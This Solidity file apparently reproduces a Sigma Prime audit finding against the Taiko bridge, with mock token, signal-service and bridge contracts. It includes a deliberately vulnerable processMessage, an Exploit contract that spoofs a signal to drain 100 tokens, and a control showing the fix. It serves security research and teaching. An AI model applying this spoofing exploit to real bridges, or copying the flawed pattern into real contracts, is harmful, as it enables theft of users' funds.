// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Taiko — any caller can make the bridge call SignalService.sendSignal
    (Sigma Prime, finding 35996).
    sendMessage and processMessage are permissionless. A message whose `to`
    is the signal service stores a hash as if the bridge had signaled it.
    A second message with that hash withdraws 100 from the bridge.
    The control rejects message.to == signalService, so the hash is never
    stored and the withdrawal reverts. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SignalService {
    mapping(address => mapping(bytes32 => bool)) public signaled;

    function sendSignal(bytes32 signal) external {
        signaled[msg.sender][signal] = true;
    }
}

contract Bridge {
    struct Message {
        address owner;
        address to;
        uint256 value;
        bytes data;
    }

    SignalService public signal;
    Asset public token;
    address public invoked;
    uint256 public released;

    constructor(SignalService signal_, Asset token_) {
        signal = signal_;
        token = token_;
    }

    function sendMessage(Message calldata m) external pure returns (bytes32) {
        return keccak256(abi.encode(m.owner, m.to, m.value));
    }

    function processMessage(Message calldata m) external {
        if (m.to == address(signal)) {
            // @> VULN: any caller can make the bridge call SignalService
            invoked = m.to;
            (bool ok,) = m.to.call(m.data);
            require(ok, "call");
            return;
        }
        bytes32 h = keccak256(abi.encode(m.owner, m.to, m.value));
        require(signal.signaled(address(this), h), "signal");
        require(token.transfer(m.owner, m.value), "pay");
        released = m.value;
    }

    function processStrict(Message calldata m) external {
        require(m.to != address(signal), "banned");
        bytes32 h = keccak256(abi.encode(m.owner, m.to, m.value));
        require(signal.signaled(address(this), h), "signal");
        require(token.transfer(m.owner, m.value), "pay");
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;

    Asset public token;
    SignalService public signal;
    Bridge public bridge;
    uint256 public got;
    bool public controlBlocked;

    constructor() {
        token = new Asset();
        signal = new SignalService();
        bridge = new Bridge(signal, token);
    }

    function run() external {
        token.mint(address(bridge), N);
        Bridge.Message memory steal;
        steal.owner = address(this);
        steal.to = address(this);
        steal.value = N;
        bytes32 h = bridge.sendMessage(steal);
        bytes memory data = abi.encodeWithSelector(signal.sendSignal.selector, h);
        Bridge.Message memory spoof;
        spoof.owner = address(this);
        spoof.to = address(signal);
        spoof.data = data;
        bridge.processMessage(spoof);
        bridge.processMessage(steal);
        got = token.balanceOf(address(this));
        require(bridge.invoked() == address(signal), "called");
        require(signal.signaled(address(bridge), h), "signaled");
        require(got == N, "drained");
        require(bridge.released() == N, "released");
    }

    function runControl() external {
        Bridge.Message memory spoof;
        spoof.to = address(signal);
        spoof.data = abi.encodeWithSelector(signal.sendSignal.selector, bytes32(uint256(1)));
        (bool ok,) = address(bridge).call(abi.encodeWithSelector(bridge.processStrict.selector, spoof));
        controlBlocked = !ok;
        require(controlBlocked, "blocked");
        require(signal.signaled(address(bridge), bytes32(uint256(1))) == false, "no signal");
        require(token.balanceOf(address(this)) == 0, "no credit");
    }
}
